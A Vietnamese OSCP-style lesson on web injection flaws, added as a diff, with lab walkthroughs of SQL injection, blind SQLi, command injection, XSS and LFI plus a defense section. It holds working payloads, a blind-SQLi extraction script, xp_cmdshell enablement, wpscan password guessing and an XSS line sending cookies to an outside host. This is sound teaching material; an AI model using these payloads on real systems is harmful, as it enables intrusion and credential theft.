@@ -1,0 +1,394 @@
+---
+title: "Lỗ hổng ứng dụng web (OWASP Top 10)"
+code: "2.3"
+level: 2
+summary: "Một ô nhập liệu trên website tưởng vô hại có thể khiến máy chủ chạy lệnh của kẻ tấn công. Bài này giải thích vì sao, qua bốn dạng lỗi phổ biến (SQL injection, XSS, command injection, LFI), và cách chặn tận gốc chung cho cả bốn."
+duration: "95 phút"
+updated: "2026-11-12"
+prereq: ["1.3", "2.2"]
+objectives:
+  - "Giải thích được nguyên lý chung của lỗi injection: dữ liệu người dùng bị máy chủ hiểu nhầm thành lệnh"
+  - "Nhận ra và thử được các payload SQLi, XSS và command injection ở mức khái niệm trên môi trường luyện tập"
+  - "Biết dùng Burp Suite để xem và sửa yêu cầu thật mà trình duyệt giấu đi"
+  - "Nói được cách phòng thủ gốc cho từng dạng, và vì sao lọc từ khoá là không đủ"
+---
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import SqliPlayground from '../../components/sim/SqliPlayground.tsx';
+import QueryDemo from '../../components/sim/QueryDemo.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+
+## Hình dung trước
+
+Hãy tưởng tượng một thư ký nhận lệnh qua giấy nhớ. Ai đó viết: "Tên khách: Lan. (Ghi chú cho thư ký: sẵn tiện xoá luôn hồ sơ phòng 3.)" Nếu thư ký không phân biệt được đâu là dữ liệu, đâu là lệnh, họ sẽ xoá nhầm hồ sơ, và người viết giấy chẳng cần đột nhập vào đâu cả, chỉ cần viết đúng một dòng.
+
+Rất nhiều lỗ hổng web là đúng tình huống này: chương trình nhầm dữ liệu người dùng thành lệnh. Ô đăng nhập, ô tìm kiếm, ô "nhập IP để ping" mà bạn gặp hằng ngày đều là chỗ người ta có thể "viết giấy nhớ" như vậy.
+
+Web là bề mặt tấn công lớn nhất của hầu hết tổ chức, và trong phòng thi OSCP, gần như máy nào có web cũng là chỗ bạn thử đầu tiên. Bài này cho bạn cái gốc chung của cả họ lỗi này, để sau đó bạn nhìn bất kỳ ô nhập liệu nào cũng biết hỏi gì.
+
+## Kiến thức chính
+
+### OWASP Top 10 và nguyên lý chung
+
+OWASP Top 10 là danh sách 10 nhóm rủi ro web phổ biến nhất, do một tổ chức phi lợi nhuận về bảo mật ứng dụng (OWASP) công bố.
+
+Nhóm nguy hiểm nhất với người mới học khai thác là **lỗi injection**, có chung một gốc: **dữ liệu người dùng bị trộn vào một câu lệnh và xử lý như một phần của lệnh đó.** Lệnh có thể là truy vấn SQL, lệnh hệ điều hành, hay mã chạy trong trình duyệt người khác.
+
+### Dữ liệu đi vào câu lệnh ra sao
+
+Để thấy lỗi xảy ra ở đâu, hãy nhìn câu lệnh mà máy chủ ghép nên. Gõ một tên bình thường, rồi gõ `O'Neil` (có dấu nháy, như họ của người thật), và so sánh hai tab. Chú ý dấu nháy làm câu lệnh đổi hình dạng thế nào, vì đó là nguyên liệu của mọi payload bên dưới:
+
+<QueryDemo client:visible />
+
+### SQL injection: payload thật
+
+"Payload" là đoạn chữ kẻ tấn công cố ý gõ vào để làm câu lệnh đổi nghĩa. Giờ thử vài payload thật trên một ô đăng nhập giả:
+
+<SqliPlayground client:visible />
+
+Điểm mấu chốt: `' OR '1'='1` làm điều kiện kiểm tra luôn đúng, nên đăng nhập được mà không cần mật khẩu; `admin'-- -` biến phần kiểm tra mật khẩu phía sau thành chú thích (bị bỏ qua); `UNION SELECT` gắn thêm một truy vấn thứ hai để rút dữ liệu từ bảng khác. Tất cả đều là hệ quả của cùng một lỗi: nối thẳng chữ người dùng vào câu lệnh.
+
+### Khi không thấy kết quả: SQLi mù
+
+Nhiều trang không in dữ liệu ra, nhưng vẫn lộ qua **phản ứng gián tiếp**. Đây là SQLi *mù* (blind), và cũng là dạng hay gặp nhất khi đi thi:
+
+- **Theo đúng/sai (boolean):** chèn một điều kiện và xem trang trả lời "có/không" khác nhau thế nào. Mỗi câu hỏi đúng/sai rút ra một bit thông tin.
+- **Theo thời gian:** chèn một hàm làm máy chủ *chờ vài giây* nếu điều kiện đúng. Trang trả lời chậm hay nhanh chính là câu trả lời. Dùng khi trang không đổi gì nhìn thấy được.
+
+Rút dữ liệu theo kiểu hỏi từng bit rất chậm nếu làm tay, nên người ta dùng **sqlmap** để tự động hoá: nó dò điểm injection, nhận ra kiểu cơ sở dữ liệu và rút dữ liệu. Như mọi công cụ trong khoá, chỉ chạy trên hệ thống của mình hoặc nơi được phép bằng văn bản; sqlmap rất ồn và để lại nhiều dấu trong log.
+
+<Callout type="note" label="Một lần dùng sqlmap trông ra sao">
+Cách nhanh nhất để đưa đúng yêu cầu cho sqlmap là lưu request (kể cả cookie đăng nhập) từ Burp ra file rồi trỏ sqlmap vào đó:<br />
+<code>sqlmap -r request.txt -p id --batch --dbs</code><br />
+<code>-r request.txt</code> nạp nguyên request đã lưu; <code>-p id</code> chỉ cho nó tham số <code>id</code> để thử; <code>--batch</code> tự chọn mặc định (không hỏi); <code>--dbs</code> liệt kê các cơ sở dữ liệu. Tìm thấy rồi thì đi sâu dần bằng <code>-D &lt;db&gt; --tables</code>, rồi <code>-T &lt;bảng&gt; --dump</code>.
+</Callout>
+
+<Callout type="warn" label="sqlmap bị cấm trong phòng thi OSCP">
+Hướng dẫn thi của OffSec xếp sqlmap vào nhóm <strong>công cụ khai thác tự động bị cấm</strong> (bài 4.2). Dùng nó trong lab để hiểu SQLi và để kiểm tra lại kết quả làm tay thì được, nhưng đừng để nó thành thói quen: trong phòng thi bạn phải tự viết payload. Phần ngay dưới đây là cách làm tay.
+</Callout>
+
+### Làm tay một UNION SQLi từ đầu tới cuối
+
+Khi trang **in kết quả truy vấn ra màn hình** (danh sách sản phẩm, trang chi tiết theo `id`), UNION là đường nhanh nhất và làm tay được trong vài phút. Ý tưởng: gắn thêm một truy vấn của mình vào sau truy vấn gốc, để dữ liệu mình muốn hiện ra đúng chỗ trang vẫn in dữ liệu thật. Có bốn bước, luôn theo thứ tự này:
+
+<Lenh noi="Thanh địa chỉ trình duyệt hoặc Repeater của Burp, nhắm vào trang item.php?id= trong lab (MySQL)" muc="Đếm số cột, tìm cột được in ra, rồi rút tên bảng và dữ liệu đăng nhập bằng UNION SELECT">
+
+<Terminal title="Bốn bước UNION SQLi làm tay">
+
+```text
+1) Đếm cột
+   ?id=1 ORDER BY 3-- -        → trang bình thường
+   ?id=1 ORDER BY 4-- -        → lỗi  ⇒ truy vấn gốc có 3 cột
+
+2) Tìm cột được in ra
+   ?id=-1 UNION SELECT 1,2,3-- -
+   → trang hiện số 2 và 3  ⇒ cột 2, 3 in ra màn hình
+
+3) Hỏi cơ sở dữ liệu đang có gì
+   ?id=-1 UNION SELECT 1,database(),version()-- -
+   ?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables
+          WHERE table_schema=database()-- -
+   ?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns
+          WHERE table_name='users'-- -
+
+4) Rút dữ liệu
+   ?id=-1 UNION SELECT 1,username,password FROM users-- -
+   → admin | 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `ORDER BY n`: bảo cơ sở dữ liệu sắp xếp theo cột thứ n. Tăng n tới khi báo lỗi; số ngay trước đó là số cột. `UNION` đòi hai truy vấn có **cùng số cột**, nên bước này bắt buộc.
+- `-- -`: mở chú thích trong MySQL, bỏ phần còn lại của câu lệnh gốc. Trên SQL Server dùng `--`, trên Oracle phải thêm `FROM dual`.
+- `id=-1`: cố ý cho truy vấn gốc không trả về dòng nào, để trang in dòng của mình.
+- `information_schema.tables` / `.columns`: "mục lục" có sẵn của MySQL, PostgreSQL và SQL Server, liệt kê mọi bảng và cột.
+
+</div>
+
+<div slot="doc">
+
+- Chuỗi 32 ký tự hex ở bước 4 là hash MD5 của mật khẩu: đem bẻ khoá ngoại tuyến (bài 2.6), rồi thử đăng nhập web, SSH và mọi dịch vụ khác.
+- Nếu tham số là chuỗi (`?name=abc`), thêm dấu nháy trước payload: `abc' UNION SELECT ...-- -`.
+- Nếu kiểu dữ liệu cột không khớp (lỗi chuyển kiểu), thay số bằng `NULL`: `UNION SELECT NULL,username,NULL`.
+- Trang không in gì ra thì quay lại kiểu mù ở trên: hỏi từng ký tự bằng `SUBSTRING()` kèm điều kiện đúng/sai hoặc `SLEEP(5)`. Làm tay chậm nhưng hợp lệ trong phòng thi; viết một script Python ngắn để lặp (bài 1.6) cũng hợp lệ.
+
+</div>
+
+</Lenh>
+
+### Khi trang không in kết quả: tự viết script Blind SQLi (thay cho sqlmap)
+
+Vì `sqlmap` bị cấm trong phòng thi OSCP, khi gặp SQLi mù (trang chỉ trả về "Tồn tại" / "Không tồn tại", hoặc phản hồi chậm 3 giây), bạn viết một script Python ngắn (bài 1.6) để dò từng ký tự bằng `SUBSTRING()` — vừa hợp lệ vừa dễ kiểm soát:
+
+<Lenh noi="Terminal trên máy Kali, nhắm vào trang chỉ trả lời đúng/sai (ví dụ có chữ 'Welcome' khi điều kiện đúng)" muc="Rút từng ký tự mật khẩu trong Blind SQLi mà không cần sqlmap">
+
+<Terminal title="Script Python dò Blind SQLi theo kiểu đúng/sai">
+
+```python
+import requests, string
+
+url = "http://10.10.14.20/item.php"
+chars = string.ascii_lowercase + string.digits + "_"
+ket_qua = ""
+
+for pos in range(1, 33):  # giả sử rút hash MD5 dài 32 ký tự
+    for ch in chars:
+        payload = f"1' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{ch}'-- -"
+        r = requests.get(url, params={"id": payload}, timeout=5)
+        if "Welcome" in r.text:   # dấu hiệu cho biết điều kiện ĐÚNG
+            ket_qua += ch
+            print(f"[{pos}] -> {ket_qua}")
+            break
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `SUBSTRING((SELECT ...), pos, 1) = '{ch}'`: hỏi cơ sở dữ liệu xem ký tự thứ `pos` của mật khẩu có bằng `ch` không.
+- `if "Welcome" in r.text`: thay `"Welcome"` bằng chuỗi chỉ xuất hiện khi truy vấn trả về đúng (hoặc đổi thành `if r.elapsed.total_seconds() > 3:` nếu dùng SQLi theo thời gian với `IF(..., SLEEP(3), 0)`).
+- Nếu không biết độ dài chuỗi trước, cho vòng `for pos` chạy tới khi hết một lượt `chars` mà không khớp ký tự nào thì `break`.
+
+</div>
+
+<div slot="doc">
+
+- Với **SQLi theo thời gian**, luôn đặt `timeout` lớn hơn thời gian `SLEEP` (ví dụ `SLEEP(3)` thì `timeout=8`) để không bị văng lỗi mạng giữa chừng.
+- Nếu chạy chậm, kiểm tra lại tập `chars` (chỉ cần hex `0123456789abcdef` nếu biết chắc là hash MD5 — giảm từ 37 lần thử xuống còn 16 lần mỗi ký tự).
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="Khi payload bị chặn hoặc không ra kết quả">
+Nếu gõ dấu nháy hoặc <code>UNION SELECT</code> mà trang báo lỗi 403/WAF hoặc trả về trống, kiểm tra 3 thứ trước khi bỏ cuộc:
+<br />1. <strong>Khoảng trắng bị lọc:</strong> thay dấu cách bằng <code>/**/</code> hoặc <code>+</code> (ví dụ <code>1'/**/OR/**/1=1--+-</code>).
+<br />2. <strong>Sai kiểu đóng ngoặc/chú thích:</strong> thử đổi <code>-- -</code> thành <code>#</code> (mã hoá URL thành <code>%23</code>) hoặc thử đóng ngoặc <code>1') UNION ...-- -</code> nếu truy vấn gốc có dấu ngoặc.
+<br />3. <strong>Không phải SQLi:</strong> nếu <code>1'</code> gây lỗi 500 nhưng <code>1''</code> (hai dấu nháy) cũng vẫn lỗi y hệt, có thể máy chủ đang báo lỗi kiểu dữ liệu (expecting integer) chứ không nối chuỗi SQL.
+</Callout>
+
+<Callout type="note" label="Từ SQLi tới chạy lệnh trên SQL Server">
+Gặp SQL Server (cổng 1433, hoặc lỗi có chữ <code>Microsoft SQL</code>) mà tài khoản DB có quyền <code>sysadmin</code>, bạn bật và dùng được <code>xp_cmdshell</code> ngay trong điểm injection (truy vấn xếp chồng): <code>'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -</code> rồi <code>'; EXEC xp_cmdshell 'whoami';-- -</code>. Kết quả thường không in ra trang, nên kiểm chứng bằng cách cho máy đích gọi về máy mình (<code>ping</code>, hoặc tải file từ máy chủ HTTP của bạn, bài 2.7).
+</Callout>
+
+Trong vài cấu hình, SQLi còn đi xa hơn đọc dữ liệu: nếu tài khoản cơ sở dữ liệu có quyền cao, nó có thể dẫn tới **chạy lệnh trên máy chủ** (ví dụ qua `xp_cmdshell` trên SQL Server hoặc ghi file qua `INTO OUTFILE` trên MySQL).
+
+Đây chính là lý do tài khoản DB mà web dùng phải có quyền tối thiểu: cùng một lỗ hổng, quyền DB quyết định thiệt hại dừng ở "đọc một bảng" hay thành "chiếm máy chủ".
+
+<ConceptMap
+  client:visible
+  title="Một gốc, bốn nhánh: dữ liệu bị hiểu thành lệnh"
+  width={760}
+  height={340}
+  nodes={[
+    { id: 'in', label: 'Chữ người dùng gõ', x: 380, y: 40, w: 160, detail: 'Ô tìm kiếm, tham số trên URL, header, tên file tải lên. Mọi thứ đi từ trình duyệt tới máy chủ đều do người dùng kiểm soát.' },
+    { id: 'sql', label: 'Câu truy vấn SQL', x: 95, y: 170, w: 150, tone: 'warn', detail: 'SQL injection: đọc bảng khác, vượt đăng nhập, đôi khi chạy lệnh qua cơ sở dữ liệu.' },
+    { id: 'cmd', label: 'Lệnh hệ điều hành', x: 285, y: 170, w: 150, tone: 'warn', detail: 'Command injection: thêm ; hoặc && để chạy lệnh của mình ngay trên máy chủ.' },
+    { id: 'html', label: 'Trang HTML trả về', x: 475, y: 170, w: 150, tone: 'warn', detail: 'XSS: đoạn script chạy trong trình duyệt của người khác, với phiên đăng nhập của họ.' },
+    { id: 'path', label: 'Đường dẫn file', x: 665, y: 170, w: 150, tone: 'warn', detail: 'LFI và path traversal: máy chủ đọc hoặc nhúng một file mà nó không định đưa ra (bài 2.8).' },
+    { id: 'fix', label: 'Tách dữ liệu khỏi lệnh', sub: 'cách sửa chung', x: 380, y: 300, w: 170, tone: 'accent', detail: 'Truy vấn tham số hoá, gọi lệnh bằng danh sách tham số, mã hoá đầu ra, chỉ cho phép tên file trong danh sách có sẵn.' },
+  ]}
+  edges={[
+    { from: 'in', to: 'sql' },
+    { from: 'in', to: 'cmd' },
+    { from: 'in', to: 'html' },
+    { from: 'in', to: 'path' },
+    { from: 'sql', to: 'fix', dashed: true },
+    { from: 'cmd', to: 'fix', dashed: true },
+    { from: 'html', to: 'fix', dashed: true },
+    { from: 'path', to: 'fix', dashed: true },
+  ]}
+/>
+
+### Các loại injection khác, cùng một gốc
+
+- **Command injection:** đầu vào đi vào lệnh hệ điều hành. Ví dụ ô "ping một IP" chạy `ping <input>`; nhập `8.8.8.8; cat /etc/passwd` khiến máy chủ chạy luôn lệnh thứ hai.
+- **XSS (cross-site scripting):** website hiển thị lại bình luận của người dùng mà không xử lý. Kẻ tấn công nhét `<script>...</script>` vào bình luận, và đoạn mã này chạy ngay trong trình duyệt của mọi người xem trang, với quyền của chính họ. Có hai dạng chính: **phản chiếu** (payload nằm trong đường link, nạn nhân phải bấm vào) và **lưu trữ** (payload nằm sẵn trong trang, ai mở cũng dính; nguy hiểm hơn nhiều).
+- **LFI (Local File Inclusion, bao gồm file cục bộ):** trang nhận tên file qua tham số mà không kiểm tra; gõ `?page=../../../../etc/passwd` (`../` nghĩa là lùi ra thư mục cha) khiến máy chủ đọc và hiển thị nhầm file hệ thống.
+
+### XSS dùng để làm gì trong một bài pentest
+
+Tự nó XSS không cho bạn shell trên máy chủ; nó cho bạn **hành động dưới danh nghĩa người đang xem trang**. Cách thử: gõ payload kiểm tra vào từng ô nhập, và cả các header mà trang quản trị có thể hiển thị lại (`User-Agent`, `Referer`). Nếu một quản trị viên mở trang dính payload, đoạn mã chạy với phiên đăng nhập của họ.
+
+```text
+Kiểm tra:        <script>alert(1)</script>
+Lấy cookie:      <script>new Image().src='http://10.10.14.7/?c='+document.cookie</script>
+```
+
+Có hai đường hay gặp trong lab:
+
+- **Lấy cookie phiên:** dùng payload thứ hai ở trên, rồi đọc cookie trong log máy chủ HTTP của bạn (`python3 -m http.server 80`). Không dùng được khi cookie có cờ `HttpOnly`.
+- **Bắt trình duyệt admin làm thay:** đoạn mã tự gửi yêu cầu tạo một tài khoản quản trị mới (cần đọc mã chống giả mạo, *nonce*, từ trang trước). Đây là đường quen thuộc từ một XSS lưu trữ trong plugin WordPress tới quyền admin, rồi tới web shell (bài 2.8).
+
+### Ba lỗi web khác nên nhận ra
+
+Ba lỗi này ít khi là đường vào chính của một máy thi OSCP, nhưng gặp nhiều trong lab và trong dự án thật. Chỉ cần nhận ra dấu hiệu và biết phép thử đầu tiên:
+
+| Lỗi | Dấu hiệu | Phép thử đầu tiên | Dẫn tới |
+|---|---|---|---|
+| **IDOR** (tham chiếu trực tiếp thiếu kiểm tra quyền) | URL hoặc API có mã số: `/invoice?id=1042`, `/api/users/17` | Đổi số sang của người khác khi đang đăng nhập bằng tài khoản thường | Đọc hoặc sửa dữ liệu của người khác, đôi khi lấy được tài khoản admin |
+| **SSTI** (tiêm vào khuôn mẫu phía máy chủ) | Trang chèn lại chữ bạn gõ vào một câu chào, thư mẫu, trang lỗi | Gõ `{{7*7}}` hoặc `${7*7}`; nếu trang in `49` thì máy chủ đã *tính* biểu thức | Thường là chạy lệnh trên máy chủ; payload tuỳ engine (Jinja2, Twig, Freemarker), tra theo tên engine |
+| **XXE** (thực thể ngoài trong XML) | Ứng dụng nhận XML: tải file `.xml`/`.docx`/`.svg`, API có `Content-Type: application/xml` | Khai báo một thực thể trỏ tới `file:///etc/passwd` rồi dùng nó trong nội dung | Đọc file trên máy chủ, hoặc bắt máy chủ gọi tới địa chỉ nội bộ (SSRF, bài 2.9) |
+
+Cả ba vẫn chung một gốc với phần trên: máy chủ tin dữ liệu người dùng gửi lên, hoặc như một mã định danh hợp lệ (IDOR), hoặc như một phần của mã cần chạy (SSTI, XXE).
+
+### Burp Suite: kính lúp của pentester web
+
+Phần lớn kiểm thử web thật làm qua một proxy chặn như **Burp Suite**. Proxy là chương trình đứng giữa trình duyệt và máy chủ: mọi yêu cầu đi qua nó, nên bạn xem và sửa được từng request trước khi gửi đi. Nhờ đó bạn thử payload ở mọi tham số, kể cả những cái trình duyệt không cho sửa.
+
+Hãy xem một ví dụ cụ thể. Giả sử trang quản trị của một máy có chức năng "nhập địa chỉ IP để ping thử", và bạn nghi nó ghép thẳng chữ bạn gõ vào một lệnh hệ điều hành. Bạn bắt yêu cầu bằng Burp, thêm `;id` vào sau địa chỉ, rồi gửi.
+
+Nếu nghi ngờ đúng, phản hồi sẽ chứa kết quả của lệnh `id`, một dòng không hề thuộc chức năng ping. Ví dụ dưới đây là bản mô phỏng của đúng khoảnh khắc đó, giống những gì bạn sẽ thấy khi thử trên DVWA hoặc Juice Shop trong lab của mình (bài 0.2):
+
+<Lenh noi="Cửa sổ Repeater của Burp Suite (hoặc log của proxy), không phải terminal" muc="Xem yêu cầu HTTP thật mà trình duyệt gửi đi và phản hồi nhận về khi bị tiêm lệnh">
+
+<Terminal title="Ví dụ command injection nhìn thấy trên dây">
+
+```text
+POST /ping HTTP/1.1
+Host: 10.10.14.30
+
+ip=8.8.8.8;id
+
+--- phản hồi ---
+PING 8.8.8.8 ... 1 packets transmitted
+uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- lệnh id đã chạy
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `POST /ping HTTP/1.1`: dòng đầu của yêu cầu. `POST` là phương thức gửi dữ liệu lên máy chủ; `/ping` là trang đích.
+- `Host: 10.10.14.30`: máy chủ đích. Header `Host` bắt buộc trong HTTP/1.1.
+- `ip=8.8.8.8;id`: **phần thân** yêu cầu, một tham số tên `ip`. Dấu `;` trong shell nghĩa là "xong lệnh trước, chạy lệnh sau", nên `;id` là lệnh kẻ tấn công tiêm thêm.
+- `--- phản hồi ---` là dòng phân cách của bài, không có trong HTTP thật.
+
+</div>
+
+<div slot="doc">
+
+- Hai dòng đầu của phản hồi (`PING 8.8.8.8 ...`) là kết quả bình thường của chức năng ping.
+- Dòng `uid=33(www-data) gid=33(www-data) ...` **không phải của chức năng ping**: nó là kết quả lệnh `id` kẻ tấn công thêm vào. Thấy dòng này chứng tỏ lệnh tuỳ ý đã chạy trên máy chủ.
+- `www-data` là tài khoản mà web server chạy. Đây là chỗ bắt đầu để leo thang tiếp (bài 3.1).
+- Mũi tên `<--` là chú thích của bài.
+
+</div>
+
+</Lenh>
+
+Đây là một lỗ hổng command injection đã được xác nhận. Việc cần làm ngay sau đó là ghi vào sổ tay: trang nào, tham số nào, payload gì, và tài khoản mà máy chủ chạy (`www-data`), vì từ đó bạn bắt đầu bước leo thang.
+
+### Khi web là một CMS: wpscan
+
+Rất nhiều máy lab (và website thật) chạy một hệ quản trị nội dung dựng sẵn, hay gặp nhất là **WordPress**. Với CMS, điểm yếu thường không nằm ở lõi mà ở **plugin/theme cũ** hoặc **mật khẩu admin yếu**. `wpscan` dò đúng những thứ đó:
+
+<Lenh noi="Terminal trên máy Kali, đã biết mục tiêu chạy WordPress" muc="Dò phiên bản, plugin có lỗ hổng và tài khoản của một site WordPress, rồi thử mật khẩu các tài khoản tìm được">
+
+<Terminal title="wpscan liệt kê rồi thử mật khẩu">
+
+```text
+kali@lab:~$ wpscan --url http://target --enumerate u,vp
+[+] WordPress 5.7.2 identified
+[i] User(s) Identified: admin, editor
+[!] Title: Contact Form 7 < 5.3.2 - File Upload (CVE-...)
+
+kali@lab:~$ wpscan --url http://target -U admin -P rockyou.txt
+[+] Valid Combinations Found: admin / Password1
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `--enumerate u,vp`: liệt kê người dùng (`u`) và các plugin có lỗ hổng đã biết (`vp` = vulnerable plugins). Đây là hai nguồn foothold hay nhất trên WordPress.
+- `-U admin -P rockyou.txt`: thử từng mật khẩu trong `rockyou.txt` cho tài khoản `admin` qua trang đăng nhập — một dạng tấn công trực tuyến (bài 2.6).
+
+</div>
+
+<div slot="doc">
+
+- Dòng `[!] Title:` là một plugin có CVE — tra `searchsploit` (bài 2.5) theo đúng tên và phiên bản để tìm mã khai thác.
+- `Valid Combinations Found` là cặp đăng nhập dùng được: vào bảng quản trị WordPress rồi, đường kinh điển lên RCE là **sửa một file theme thành mã PHP** (nối sang web shell, bài 2.8).
+- Thử mật khẩu online rất ồn và có thể gây khoá tài khoản — chỉ chạy trong lab hoặc nơi được phép.
+
+</div>
+
+</Lenh>
+
+<LabBrief
+  ten="Tự rút bảng tài khoản và chạy một lệnh, không nhìn lại ví dụ ở trên"
+  muctieu="Trên một ứng dụng web cố tình để lỗi, tự tìm một ô dễ bị SQL injection và một ô dễ bị command injection, rồi khai thác bằng tay"
+  may="DVWA mức Low (cài theo bài 0.2), hoặc OWASP Juice Shop"
+  ip="http://10.10.14.20/dvwa/"
+  thoigian="40 phút"
+  xong="Bạn đọc được cột mật khẩu của bảng tài khoản qua UNION, và chạy được lệnh id trên máy chủ qua một ô nhập khác"
+>
+
+1. Vào trang SQL Injection, xác nhận ô nhập bị lỗi bằng một dấu nháy đơn.
+2. Đếm số cột bằng `ORDER BY`, rồi dùng `UNION SELECT` để tìm cột hiển thị ra màn hình.
+3. Rút tên bảng, tên cột rồi tới dữ liệu thật của bảng tài khoản.
+4. Vào trang Command Injection, nối thêm một lệnh `id` vào sau giá trị hợp lệ.
+5. Mở Burp Repeater, lặp lại bước 4 để nhìn request/response thật thay vì qua trình duyệt.
+
+<div slot="goiy1">
+Bốn bước UNION SQLi đã có đủ trong mục "Làm tay một UNION SQLi từ đầu tới cuối" ở phần Kiến thức chính của chính bài này.
+</div>
+
+<div slot="goiy2">
+Dấu chấm phẩy hoặc dấu `&&` nối thêm lệnh trong shell; phần "Các loại injection khác, cùng một gốc" giải thích đúng cơ chế command injection dùng ở bước 4.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: cột mật khẩu hiện ra là một chuỗi 32 ký tự hex (hash MD5); kết quả `id` có dòng `uid=33(www-data)`.
+- `ORDER BY` không bao giờ báo lỗi dù tăng số cột: có thể bạn đang gõ ở ô khác hoặc mức bảo mật DVWA đã đổi, kiểm tra lại DVWA Security đang đặt Low.
+- UNION báo lỗi kiểu dữ liệu: thử thay số bằng `NULL` ở cột không in ra được, như bài đã nói.
+- Burp không bắt được request: kiểm tra proxy trình duyệt đã trỏ đúng cổng 8080 và chứng chỉ Burp đã được tin cậy trong lab.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là lập trình viên hay người duyệt mã của công ty, đừng cố nhớ từng loại payload. Hãy nhớ một nguyên tắc chung: mọi lỗi injection đều chặn được từ gốc khi bạn tách biệt dữ liệu người dùng khỏi phần lệnh thực thi. Với <strong>SQL</strong>, hãy luôn dùng truy vấn tham số hoá (prepared statements) thay vì cộng chuỗi. Với <strong>lệnh hệ điều hành</strong>, tránh gọi thẳng shell với đầu vào người dùng mà hãy dùng API của ngôn ngữ kết hợp danh sách cho phép (allowlist).
+
+Với <strong>HTML/XSS</strong>, mã hoá ký tự đặc biệt khi in ra màn hình (escape) và đặt header <code>Content-Security-Policy</code>. Với <strong>LFI</strong>, tuyệt đối không ghép đường dẫn file từ tham số người dùng. Mọi bước kiểm tra đầu vào phải đặt ở <strong>máy chủ</strong> vì kẻ tấn công luôn bỏ qua trình duyệt, và tài khoản cơ sở dữ liệu mà web dùng chỉ nên có quyền tối thiểu (tắt <code>xp_cmdshell</code>, không cấp quyền ghi file) để nếu có lỗi cũng không biến thành chiếm máy chủ.
+
+Về <strong>phát hiện</strong>: quá trình dò SQLi để lại dấu vết rất rõ trong log web — hàng loạt request tới cùng một tham số với các ký tự <code>'</code>, <code>UNION</code>, <code>SLEEP</code>, hoặc một tham số bỗng nhận hàng trăm biến thể trong ít phút. WAF giúp chặn bớt payload phổ thông, còn log truy vấn chậm của cơ sở dữ liệu sẽ tố cáo các đòn SQLi mù theo thời gian khi đẩy về SOC (bài 8.1).
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Nghĩ chỉ ô đăng nhập mới có lỗi injection.** Người mới thường thử đúng một chỗ rồi kết luận "trang này an toàn". Thật ra mọi đầu vào đều đáng ngờ: ô tìm kiếm, tham số trên URL, header, cookie, và chỗ hay bị bỏ sót nhất là những tham số ẩn mà trình duyệt không cho bạn sửa.
+- **Tin rằng lọc từ khoá là đủ.** Nếu lập trình viên chặn chữ `UNION`, kẻ tấn công viết `UnIoN` hoặc mã hoá lại. Danh sách chặn gần như luôn có kẽ hở; chỉ việc tách dữ liệu khỏi lệnh mới chặn tận gốc. Nếu bạn là người báo cáo, đừng đề xuất "lọc thêm từ khoá" làm cách sửa.
+- **Chỉ kiểm tra qua trình duyệt.** Trình duyệt tự giới hạn những gì bạn gửi được. Dùng Burp để thấy và sửa request thật, vì kẻ tấn công cũng không dùng trình duyệt bình thường.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: "Payload admin'-- - bỏ qua đăng nhập bằng cách nào?", options: ['Đoán đúng mật khẩu', 'Biến phần kiểm tra mật khẩu thành chú thích', 'Làm sập máy chủ'], answer: 1, explain: 'Dấu -- mở đầu chú thích SQL, phần kiểm tra mật khẩu phía sau bị bỏ qua.' },
+    { q: 'Phản hồi chứa `uid=33(www-data)` sau khi gửi `ip=8.8.8.8;id` chứng tỏ điều gì?', options: ['Máy chủ bị sập', 'Command injection đã chạy được lệnh trên máy chủ', 'Không có gì bất thường'], answer: 1, explain: 'Lệnh id chạy và trả kết quả nghĩa là đầu vào đã bị thực thi như lệnh hệ điều hành.' },
+    { q: 'Burp Suite giúp gì trong kiểm thử web?', options: ['Tăng tốc website', 'Đứng giữa để xem và sửa từng request trước khi gửi', 'Vá lỗ hổng tự động'], answer: 1, explain: 'Là proxy chặn, Burp cho phép thử payload ở mọi tham số, kể cả cái trình duyệt không cho sửa.' },
+    { q: 'Cách phòng SQL injection tốt nhất là gì?', options: ['Cấm gõ dấu nháy', 'Dùng truy vấn tham số hoá', 'Ẩn ô tìm kiếm'], answer: 1, explain: 'Tham số hoá tách dữ liệu khỏi câu lệnh một cách triệt để.' },
+    { q: 'SQLi "mù theo thời gian" rút thông tin bằng cách nào?', options: ['In thẳng dữ liệu ra trang', 'Chèn điều kiện khiến máy chủ chờ vài giây nếu đúng, rồi đọc câu trả lời qua tốc độ phản hồi', 'Làm sập cơ sở dữ liệu'], answer: 1, explain: 'Khi trang không hiển thị dữ liệu, thời gian phản hồi nhanh hay chậm trở thành câu trả lời đúng/sai.' },
+    { q: 'Vì sao tài khoản cơ sở dữ liệu mà web dùng nên có quyền tối thiểu?', options: ['Để chạy nhanh hơn', 'Vì khi có SQLi, quyền DB quyết định thiệt hại dừng ở đọc dữ liệu hay thành chạy lệnh trên máy chủ', 'Vì luật bắt buộc'], answer: 1, explain: 'Quyền cao (như bật xp_cmdshell hoặc ghi file) biến một lỗ hổng đọc dữ liệu thành chiếm máy chủ.' },
